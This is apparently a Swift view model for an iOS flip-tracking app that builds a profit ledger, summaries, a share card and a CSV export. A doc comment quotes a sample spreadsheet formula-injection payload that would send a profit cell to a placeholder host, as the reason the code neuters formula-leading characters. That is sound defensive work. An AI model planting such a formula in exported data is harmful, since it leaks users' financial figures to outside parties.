import SwiftUI
import SwiftData

/// Drives the "My Flips" ledger. Everything is computed live from the existing
/// `ScanResult` store — no separate persistence. Money math is done in `Decimal`.
@MainActor
@Observable
final class FlipsViewModel {

    // ── Filter & sort ─────────────────────────────────────────────────────────
    enum StatusFilter: String, CaseIterable, Identifiable {
        case all = "All", owned = "Owned", listed = "Listed", sold = "Sold"
        var id: String { rawValue }
    }

    enum SortOrder: String, CaseIterable, Identifiable {
        case date = "Date", profit = "Profit", roi = "ROI"
        var id: String { rawValue }
    }

    /// Totals scope: free tier sees the current month, Pro sees all-time.
    enum Scope { case month, allTime }

    var filter: StatusFilter = .all
    var sort: SortOrder = .date

    // ── Tracked items (owned / listed / sold — raw scans stay in My Finds) ─────

    func trackedItems(_ all: [ScanResult]) -> [ScanResult] {
        all.filter { $0.status != .scanned }
    }

    /// Filtered + sorted list for the ledger table.
    func visibleItems(_ all: [ScanResult]) -> [ScanResult] {
        let tracked = trackedItems(all)
        let filtered: [ScanResult]
        switch filter {
        case .all:    filtered = tracked
        case .owned:  filtered = tracked.filter { $0.status == .owned }
        case .listed: filtered = tracked.filter { $0.status == .listed }
        case .sold:   filtered = tracked.filter { $0.status == .sold }
        }
        return sorted(filtered)
    }

    private func sorted(_ items: [ScanResult]) -> [ScanResult] {
        switch sort {
        case .date:
            return items.sorted { effectiveDate($0) > effectiveDate($1) }
        case .profit:
            return items.sorted { a, b in
                rankNilLast(a.realizedProfit, b.realizedProfit, tieBreak: { effectiveDate(a) > effectiveDate(b) })
            }
        case .roi:
            return items.sorted { a, b in
                rankNilLast(a.roi, b.roi, tieBreak: { effectiveDate(a) > effectiveDate(b) })
            }
        }
    }

    /// Sorts present values descending, pushing `nil` (e.g. profit unknown) last.
    private func rankNilLast(_ lhs: Decimal?, _ rhs: Decimal?, tieBreak: () -> Bool) -> Bool {
        switch (lhs, rhs) {
        case let (l?, r?): return l == r ? tieBreak() : l > r
        case (_?, nil):    return true
        case (nil, _?):    return false
        case (nil, nil):   return tieBreak()
        }
    }

    private func effectiveDate(_ r: ScanResult) -> Date { r.soldDate ?? r.timestamp }

    /// The free tier's row cap, applied to *sold* rows only.
    ///
    /// It used to be `prefix(cap)` over the whole visible list. That list is
    /// owned + listed + sold ordered by `soldDate ?? timestamp` descending, so
    /// ten items scanned and marked Owned today outranked last week's two
    /// sales, filled the cap, and pushed both sales past it: a free user with
    /// two sold flips against a ten-sold allowance saw neither of them, and an
    /// "Unlock 2 more" row in their place. `Config.ledgerFreeSoldCap`'s own
    /// doc comment, this view's, and AUDIT-2026-09-07 all describe the gate as
    /// the most recent N *sold*.
    ///
    /// Which sales are kept is decided by recency and not by `sort`, so
    /// changing the sort re-orders the ledger without moving rows across the
    /// paywall — the rows come back in `visible`'s order either way, because
    /// `filter` preserves it.
    ///
    /// `hiddenSold` counts only the sales withheld. Nothing else is ever
    /// withheld now, so it is the whole of what "unlock" buys in this list.
    func freeTierItems(_ visible: [ScanResult],
                       cap: Int = Config.ledgerFreeSoldCap)
    -> (rows: [ScanResult], hiddenSold: Int) {
        let sold = visible.filter { $0.status == .sold }
        guard sold.count > cap else { return (visible, 0) }
        let kept = Set(
            sold.sorted { effectiveDate($0) > effectiveDate($1) }
                .prefix(cap)
                .map(\.id)
        )
        let rows = visible.filter { $0.status != .sold || kept.contains($0.id) }
        return (rows, sold.count - cap)
    }

    // ── Summary ────────────────────────────────────────────────────────────────

    struct Summary {
        var realizedProfit: Decimal = 0
        /// Everything sold in scope, priced or not.
        var itemsSold: Int = 0
        /// The subset `realizedProfit` is actually the profit *of*. Smaller
        /// than `itemsSold` by exactly the sales with no paid price.
        var itemsPriced: Int = 0

        /// Whether the headline figure covers every sale it sits above.
        var profitCoversEverySale: Bool { itemsPriced == itemsSold }

        /// How the sold count should read under a profit total, given that
        /// some of those sales may not be in it.
        ///
        /// Split out so the header and the shareable month card cannot drift:
        /// they render the same two numbers and there is nowhere else the gap
        /// can show.
        var soldLabel: String {
            let sales = "\(itemsSold) item\(itemsSold == 1 ? "" : "s") sold"
            guard !profitCoversEverySale else { return sales }
            return "\(sales) · \(itemsSold - itemsPriced) needs a paid price"
        }
        var totalInvested: Decimal = 0
        var averageROI: Decimal?          // fraction, e.g. 0.42
        var bestFlip: ScanResult?
        var unrealizedCount: Int = 0
        var unrealizedInvested: Decimal = 0
    }

    func summary(_ all: [ScanResult], scope: Scope) -> Summary {
        var s = Summary()

        let sold = all.filter { $0.status == .sold }
        let scopedSold = scope == .month ? sold.filter { isInCurrentMonth($0.soldDate) } : sold

        // Two counts, because they are two different facts.
        //
        // `realizedProfit` is nil without a paid price, and dropping those rows
        // from the sum rather than guessing a cost basis is deliberate and
        // tested. Pairing that sum with a count taken over the *larger* set was
        // not: one uncosted sale rendered as "+$0" above "1 item sold", which
        // reads as having sold something for nothing rather than as a missing
        // number — and with two sales, one uncosted, the headline quietly
        // understates real profit with nothing on screen to say so.
        //
        // In the list the gap is already visible (the row shows "—" and says
        // "Profit unknown — add what you paid"). The header and the share card
        // show only totals, so they need the count to carry it.
        s.itemsSold = scopedSold.count
        let priced = scopedSold.compactMap(\.realizedProfit)
        s.itemsPriced = priced.count
        s.realizedProfit = priced.reduce(0, +)

        let rois = scopedSold.compactMap(\.roi)
        s.averageROI = rois.isEmpty ? nil : rois.reduce(0, +) / Decimal(rois.count)

        s.bestFlip = scopedSold
            .filter { $0.realizedProfit != nil }
            .max { ($0.realizedProfit ?? 0) < ($1.realizedProfit ?? 0) }

        // Cost basis deployed: paid on everything currently owned/listed/sold.
        s.totalInvested = (all.filter { $0.status != .scanned })
            .compactMap(\.paidPrice)
            .reduce(Decimal(0)) { $0 + Decimal($1) }

        // Open positions (money still on the table).
        let open = all.filter { $0.status == .owned || $0.status == .listed }
        s.unrealizedCount = open.count
        s.unrealizedInvested = open.compactMap(\.paidPrice).reduce(Decimal(0)) { $0 + Decimal($1) }

        return s
    }

    // ── Monthly profit bars (last N months, timezone-correct) ───────────────────

    struct MonthBucket: Identifiable {
        let id = UUID()
        let monthStart: Date
        let profit: Decimal
        let label: String       // "Jul"
    }

    func monthlyBuckets(_ all: [ScanResult], count: Int = 6) -> [MonthBucket] {
        let cal = Calendar.current
        let sold = all.filter { $0.status == .sold }
        guard let thisMonthStart = cal.dateInterval(of: .month, for: Date())?.start else { return [] }

        return (0..<count).reversed().compactMap { offset -> MonthBucket? in
            guard let monthStart = cal.date(byAdding: .month, value: -offset, to: thisMonthStart),
                  let interval = cal.dateInterval(of: .month, for: monthStart) else { return nil }
            let profit = sold
                .filter { r in r.soldDate.map { interval.contains($0) } ?? false }
                .compactMap(\.realizedProfit)
                .reduce(Decimal(0), +)
            return MonthBucket(monthStart: monthStart, profit: profit, label: Self.monthLabel(monthStart))
        }
    }

    // ── Share "my month" ────────────────────────────────────────────────────────

    /// True when the current month has at least one sold item — the only case a
    /// month card should render (never a sad/empty card).
    func hasSalesThisMonth(_ all: [ScanResult]) -> Bool {
        all.contains { $0.status == .sold && isInCurrentMonth($0.soldDate) }
    }

    func renderMonthCard(_ all: [ScanResult]) -> UIImage? {
        guard hasSalesThisMonth(all) else { return nil }
        let s = summary(all, scope: .month)
        // The card carries the *priced* count, not every sale.
        //
        // This is the one surface that leaves the app, so the two numbers on it
        // have to be of the same thing: a total covering one sale printed above
        // "2 items sold" is a figure nobody can check. The in-app header says
        // the other half — which sales still need a paid price — because that
        // is a note to the owner, not something to post.
        guard s.itemsPriced > 0 else { return nil }
        let card = MonthShareCardView(
            monthTitle: Self.monthYearLabel(Date()),
            realizedProfit: s.realizedProfit,
            itemsSold: s.itemsPriced,
            bestFlipName: s.bestFlip?.itemName,
            bestFlipProfit: s.bestFlip?.realizedProfit
        )
        let renderer = ImageRenderer(content: card)
        // Capped at 2 for the same reason as the result-sheet cards — see
        // `ResultViewModel.shareCardScale`.
        renderer.scale = ResultViewModel.shareCardScale
        return renderer.uiImage
    }

    // ── CSV export ──────────────────────────────────────────────────────────────

    /// Plain UTF-8 CSV of sold flips for the user's bookkeeping. RFC-4180 quoting.
    /// Columns: Date, Item, Paid, Sold, Fees, Profit, ROI.
    func csv(_ all: [ScanResult]) -> String {
        let sold = all.filter { $0.status == .sold }
            .sorted { ($0.soldDate ?? $0.timestamp) < ($1.soldDate ?? $1.timestamp) }

        // A local-calendar day, matching every other date rule in this feature.
        //
        // This was an `ISO8601DateFormatter` with only `.withFullDate`, and
        // that formatter's `timeZone` defaults to **GMT** — so the exported day
        // was the UTC day while `isInCurrentMonth` and `monthlyBuckets` both
        // use `Calendar.current`, and the export's own filename via
        // `fileStamp()` uses the local zone. `soldDate` carries a real
        // time-of-day (wall-clock `Date()` or a local DatePicker), not a
        // normalised midnight, so the two disagreed for every sale logged after
        // 17:00 Pacific or 20:00 Eastern — most evenings, for most of the US
        // user base. At a month boundary the sale exported into the wrong
        // month; on 31 December, into the wrong tax year, while the app's own
        // month card counted it correctly.
        //
        // Same construction as `fileStamp()`, so the two cannot drift.
        let day = DateFormatter()
        day.locale = Locale(identifier: "en_US_POSIX")
        day.calendar = Calendar.current
        day.dateFormat = "yyyy-MM-dd"

        var rows = ["Date,Item,Paid,Sold,Fees,Profit,ROI"]
        for r in sold {
            let date = r.soldDate.map { day.string(from: $0) } ?? ""
            let paid = r.paidPrice.map { Self.moneyColumn($0) } ?? ""
            let soldStr = r.soldPrice.map { Self.moneyColumn($0) } ?? ""
            let fees = r.feesEstimate.map { Self.moneyColumn($0) } ?? ""
            let profit = r.realizedProfit.map { Self.moneyColumn($0) } ?? ""
            let roi = r.roi.map { Self.roiColumn($0) } ?? ""
            // Only the item name is free text, and only free text is neutered.
            // Running the money columns through the same escape would make a
            // loss ("-12.50") a text cell, and reconciling the file is the
            // entire point of it.
            let cols = [Self.csvEscape(date), Self.csvText(r.itemName),
                        Self.csvEscape(paid), Self.csvEscape(soldStr),
                        Self.csvEscape(fees), Self.csvEscape(profit),
                        Self.csvEscape(roi)]
            rows.append(cols.joined(separator: ","))
        }
        return rows.joined(separator: "\r\n") + "\r\n"
    }

    /// Wraps CSV text as a temporary `.csv` file for the share sheet.
    func csvFileURL(_ all: [ScanResult]) -> URL? {
        let text = csv(all)
        let name = "SnapWorth-Flips-\(Self.fileStamp()).csv"
        let url = FileManager.default.temporaryDirectory.appendingPathComponent(name)
        do {
            try text.data(using: .utf8)?.write(to: url)
            return url
        } catch {
            return nil
        }
    }

    private static func fileStamp() -> String {
        let f = DateFormatter()
        f.locale = Locale(identifier: "en_US_POSIX")
        f.dateFormat = "yyyy-MM-dd"
        return f.string(from: Date())
    }

    // ── Formatting (reuses the app's currency formatter / locale) ───────────────

    func money(_ d: Decimal) -> String {
        NumberFormatter.snapCurrency.string(from: NSDecimalNumber(decimal: d)) ?? "$0"
    }

    /// Signed money for profit rows ("+$40", "−$12").
    func signedMoney(_ d: Decimal) -> String {
        let base = money(abs(d))
        if d < 0 { return "−\(base)" }
        return "+\(base)"
    }

    func roiPercent(_ fraction: Decimal) -> String {
        let value = Int((NSDecimalNumber(decimal: fraction).doubleValue * 100).rounded())
        return (value > 0 ? "+" : "") + "\(value)%"
    }

    // ── Helpers ──────────────────────────────────────────────────────────────────

    private func isInCurrentMonth(_ date: Date?) -> Bool {
        guard let date else { return false }
        return Calendar.current.isDate(date, equalTo: Date(), toGranularity: .month)
    }

    /// Every numeric column at the same scale, in a spreadsheet's own notation.
    ///
    /// The columns used to split on overload resolution. `paidPrice`,
    /// `soldPrice` and `feesEstimate` are `Double?` and went through
    /// `String(format: "%.2f")`; `realizedProfit` is `Decimal?` and went
    /// through `NSDecimalNumber.stringValue`, which prints the value's natural
    /// scale and nothing more. That profit is built by subtracting
    /// `Decimal(Double)` conversions — the conversion `MarketplaceFees` warns
    /// "would capture the Double's rounding error" — so the one column an
    /// accountant actually reconciles was the only money column with no
    /// guaranteed cent scale: 8.00, 65.00, 9.00 exported a profit of "48".
    ///
    /// POSIX and ungrouped on purpose: a locale that groups with a comma would
    /// put a column break inside a number, and one that uses a decimal comma
    /// would make every money cell text.
    private static let csvNumber: NumberFormatter = {
        let f = NumberFormatter()
        f.locale = Locale(identifier: "en_US_POSIX")
        f.numberStyle = .decimal
        f.usesGroupingSeparator = false
        f.minimumFractionDigits = 2
        f.maximumFractionDigits = 2
        f.roundingMode = .halfUp
        return f
    }()

    private static func moneyColumn(_ value: Decimal) -> String {
        csvNumber.string(from: NSDecimalNumber(decimal: value)) ?? "0.00"
    }

    /// The `Double` overload formats the `Double` directly rather than going
    /// through `Decimal(value)` — that conversion is the lossy one, and there
    /// is nothing to gain by taking it on the way to two decimal places.
    private static func moneyColumn(_ value: Double) -> String {
        csvNumber.string(from: NSNumber(value: value)) ?? "0.00"
    }

    /// ROI to two decimals, so a row can be recomputed from its own columns.
    ///
    /// It was `Int((fraction * 100).rounded())`, which exported 0.4249 as
    /// "42%" — profit ÷ paid from the neighbouring cells does not give 42, so
    /// the column could not be checked against the file it lives in. Still a
    /// percent with its sign, because that is what the header says and what a
    /// spreadsheet reads "42.49%" back as.
    private static func roiColumn(_ fraction: Decimal) -> String {
        (csvNumber.string(from: NSDecimalNumber(decimal: fraction * 100)) ?? "0.00") + "%"
    }

    private static func monthLabel(_ date: Date) -> String {
        let f = DateFormatter()
        f.calendar = Calendar.current
        f.locale = .current
        f.setLocalizedDateFormatFromTemplate("MMM")
        return f.string(from: date)
    }

    private static func monthYearLabel(_ date: Date) -> String {
        let f = DateFormatter()
        f.calendar = Calendar.current
        f.locale = .current
        f.setLocalizedDateFormatFromTemplate("MMMM yyyy")
        return f.string(from: date)
    }

    /// RFC-4180 field quoting: wrap in quotes and double internal quotes when the
    /// value contains a comma, quote, or newline (e.g. a note with commas).
    private static func csvEscape(_ field: String) -> String {
        guard field.contains(where: { $0 == "," || $0 == "\"" || $0 == "\n" || $0 == "\r" }) else {
            return field
        }
        return "\"" + field.replacingOccurrences(of: "\"", with: "\"\"") + "\""
    }

    /// Characters a spreadsheet reads as "this cell is a formula".
    static let csvFormulaLeads: Set<Character> = ["=", "+", "-", "@", "\t", "\r"]

    /// A free-text field, made safe to open.
    ///
    /// RFC-4180 quoting is not a defence. Excel, Numbers and LibreOffice strip
    /// the quotes on import and then evaluate any cell whose first character is
    /// one of `csvFormulaLeads`. The Item column is model-generated from
    /// whatever text was visible on the label and is user-editable, so
    /// `=HYPERLINK("http://x/?"&C2,"click")` as an item name becomes a live
    /// formula that reads the profit cell next to it — in the one file in this
    /// product a user is likely to forward to an accountant.
    ///
    /// A leading apostrophe is the standard neutering: spreadsheets take it as
    /// "the rest is text". It costs a visible `'` on the rare honest name that
    /// starts with a dash, which is the right side of that trade.
    static func csvText(_ field: String) -> String {
        guard let first = field.first, csvFormulaLeads.contains(first) else {
            return csvEscape(field)
        }
        return "\"'" + field.replacingOccurrences(of: "\"", with: "\"\"") + "\""
    }
}
